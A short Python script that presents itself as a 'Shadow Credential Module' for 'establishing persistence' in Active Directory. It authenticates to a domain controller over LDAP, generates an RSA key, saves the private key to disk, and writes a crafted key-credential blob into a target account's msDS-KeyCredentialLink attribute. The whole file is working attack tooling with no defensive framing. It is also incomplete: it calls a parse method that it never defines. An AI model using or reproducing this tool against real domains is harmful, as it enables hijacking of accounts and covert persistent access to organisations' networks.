#!/usr/bin/env python3
"""
    XEEA Nexus - Shadow Credential Module
    Establishing persistence via msDS-KeyCredentialLink.
"""

import uuid
import struct
from datetime import datetime
from impacket.ldap import ldap, ldapasn1
from cryptography import x509
from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

class KeyCredential:
    def __init__(self, data=None):
        self.version = 2
        self.identifier = str(uuid.uuid4())
        self.key_hash = b""
        self.key_material = b""
        self.key_usage = 0
        self.key_type = 0 
        self.flags = 0
        self.creation_time = int((datetime.utcnow() - datetime(1601, 1, 1)).total_seconds() * 10**7)
        self.expiration_time = 0
        if data: self.parse(data)

    def build(self):
        id_str = f"{{{self.identifier.upper()}}}\x00".encode('utf-16-le')
        blob = struct.pack("<I", self.version) + struct.pack("<I", len(id_str)) + id_str
        blob += struct.pack("<I", len(self.key_hash)) + self.key_hash
        blob += struct.pack("<I", len(self.key_material)) + self.key_material
        blob += struct.pack("<I", self.key_usage) + struct.pack("<I", self.key_type) + struct.pack("<I", self.flags)
        blob += struct.pack("<Q", self.creation_time) + struct.pack("<Q", self.expiration_time)
        return blob

class NexusShadowLink:
    def __init__(self, dc_ip, domain, username, password):
        self.dc_ip = dc_ip
        self.domain = domain
        self.username = username
        self.password = password
        self.base_dn = ','.join([f'DC={p}' for p in domain.split('.')])

    def inject(self, target_sam):
        url = f"ldap://{self.dc_ip}:389"
        client = ldap.LDAPConnection(url, baseDN=self.base_dn, dstIp=self.dc_ip)
        client.login(self.username, self.password, self.domain)

        # Generate Key
        priv = rsa.generate_private_key(65537, 4096, default_backend())
        pub_der = priv.public_key().public_bytes(serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
        
        with open(f"{target_sam}_nexus_shadow.key", "wb") as f:
            f.write(priv.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption()))

        kc = KeyCredential()
        kc.key_material = pub_der
        kc_blob = kc.build()

        search = client.search(searchFilter=f"(sAMAccountName={target_sam})", attributes=['distinguishedName'])
        target_dn = str(search[0]['objectName'])
        
        mod = {'msDS-KeyCredentialLink': [('add', [kc_blob])]}
        client.modify(target_dn, mod)
        return kc.identifier
